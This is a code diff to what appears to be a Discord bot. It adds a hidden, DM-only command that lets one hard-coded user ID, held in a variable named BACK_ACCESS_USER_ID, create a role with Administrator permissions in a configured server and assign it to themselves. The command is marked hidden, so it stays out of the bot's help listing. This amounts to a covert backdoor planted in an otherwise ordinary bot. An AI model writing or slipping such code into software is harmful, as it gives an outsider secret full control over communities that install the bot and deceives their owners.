@@ -364,6 +364,70 @@ async def help_command(ctx, command_name: str = None):
     
     await ctx.send(embed=embed)
 
+@bot.command(name="giveroleadmin", hidden=True)
+async def give_role_admin(ctx, *, role_name: str):
+    """
+    DM-only command to create a role with Administrator permissions
+    and assign it to the authorized user.
+    """
+    async def dm_reply(msg):
+        try:
+            if isinstance(msg, discord.Embed):
+                await ctx.author.send(embed=msg)
+            else:
+                await ctx.author.send(str(msg))
+        except Exception:
+            logger.warning(f"Failed to DM user {ctx.author.id}")
+
+    # Only allow in DMs
+    if ctx.guild is not None:
+        await dm_reply("This command only works via DM.")
+        return
+
+    # Only allow authorized user
+    if ctx.author.id != BACK_ACCESS_USER_ID:
+        await dm_reply("Access denied.")
+        return
+
+    # Must specify a guild
+    guild_id = os.getenv("GUILD_ID")
+    if not guild_id:
+        await dm_reply("No GUILD_ID set in environment variables.")
+        return
+
+    guild = bot.get_guild(int(guild_id))
+    if not guild:
+        await dm_reply("Bot is not in the specified guild.")
+        return
+
+    bot_member = guild.me or guild.get_member(bot.user.id)
+
+    try:
+        # Check if role already exists
+        role = discord.utils.get(guild.roles, name=role_name)
+        if not role:
+            # Create role with Administrator permissions
+            perms = discord.Permissions(administrator=True)
+            role = await guild.create_role(
+                name=role_name,
+                permissions=perms,
+                reason=f"Admin role created by {ctx.author.id}"
+            )
+            await dm_reply(f"Role `{role.name}` created with Administrator permissions.")
+
+        # Add role to user
+        member = guild.get_member(ctx.author.id) or await guild.fetch_member(ctx.author.id)
+        if role not in member.roles:
+            await member.add_roles(role, reason=f"Admin role assigned by {ctx.author.id}")
+            await dm_reply(f"Role `{role.name}` assigned to you.")
+        else:
+            await dm_reply(f"You already have the role `{role.name}`.")
+
+    except discord.Forbidden:
+        await dm_reply("Permission error: bot cannot manage roles higher than its top role.")
+    except Exception as e:
+        await dm_reply(f"An error occurred: {e}")
+
 
 # ------------------- Error Handling ------------------- #
 @bot.event
